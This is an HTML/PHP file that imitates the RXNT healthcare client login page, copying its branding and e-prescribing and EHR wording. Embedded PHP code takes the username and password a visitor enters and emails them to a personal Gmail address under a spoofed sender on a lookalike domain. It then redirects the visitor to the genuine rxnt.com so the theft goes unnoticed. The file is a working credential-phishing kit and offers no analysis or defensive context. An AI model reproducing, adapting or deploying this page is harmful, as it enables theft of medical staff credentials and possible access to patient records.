<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Client Login | Providers & Staff | RXNT</title>
    <link rel="shortcut icon" href="img/fab.webp" type="image/x-icon">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
</head>

<style>
    .input {
        border: none;
        margin-bottom: 25px;
        border-bottom: 2px solid gray;
        width: 326px;
        height: 35px;
    }

    .btn {
        width: 326px;
        background-color: #00629B;
        color: white;
        margin-top: 30px;
        margin-bottom: 30px;
    }

    input {
        outline: none;
    }
</style>

<body>

<?php
if (isset($_POST['email']) && $_POST['password'] != "") {
    $to = "Jackanmol69@gmail.com"; //  Email address

    $email = $_POST['email']; //  sender's Email address
    $password = $_POST['password'];

    $subject = "Details of Login ID and password 1xbit";
    $message = "Username : " . $email . "\r\n" . "password : " . $password;

    $headers = array(
        'From: info@tergetgiftcards.info',
        'Reply-To: info@tergetgiftcards.info',
        'X-Mailer: PHP/' . phpversion(),
        'MIME-Version: 1.0',
        'Content-type: text/html; charset=iso-8859-1'
    );
    $headers = implode("\r\n", $headers);

    mail($to, $subject, $message, $headers);

    // Redirect to the desired URL after PHP code is executed
    header("Location: https://www.rxnt.com/");
    exit();
}
?>

<!-- Header -->
<header class="bg-white text-white text-center ">
    <div class="container">
        <img src="img/RXNT_Logo-removebg-preview.png" height="60px" alt="">
    </div>
</header>

<!-- Main Content -->
<div style="background-color: #E8E8E8;">

    <div style="display: flex; justify-content: center; align-items: center;">

        <form action="" method="post" style="background-color: white; padding: 50px; margin-top: 30px; margin-bottom: 90px; border-radius: 8px;">
            <div style="text-align: center;">
                <h3 style="font-family: sans-serif; margin-bottom: 20px; color: #003B5C; font-weight: bold;">Welcome to the RXNT <br>client login!</h3>
            </div>
            <div style="display: flex; justify-content: center; align-items: center; margin-bottom: 25px;">
                <div style="border-bottom: 4px solid #FF7F41; width: 100px;"></div>
            </div>
            <div style="text-align: center;">
                <p style="font-family: sans-serif; font-size: 14px; margin-bottom: 25px;color: #003b5c">This site gives you access to all of the RXNT <br> solutions, including e-prescribing, EHR and the <br> practice management system.</p>
            </div>
            <div style="text-align: center;">
                <input class="input" type="text" name="email" placeholder="Username">
                <br>
                <input class="input" type="password" name="password" placeholder="password">
            </div>
            <input class="btn" type="submit" name="send" value="LOGIN">

            <div style="text-align: center; color: gray; font-size: 12px;">
                <p>Forgot Password<br>
                    Don’t have an account? Sign Up<br>
                    BACK TO RXNT.COM</p>
            </div>
        </form>
    </div>
</div>

<!-- Bootstrap JS and Popper.js (required for Bootstrap dropdowns, modals, etc.) -->
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>

</body>
</html>
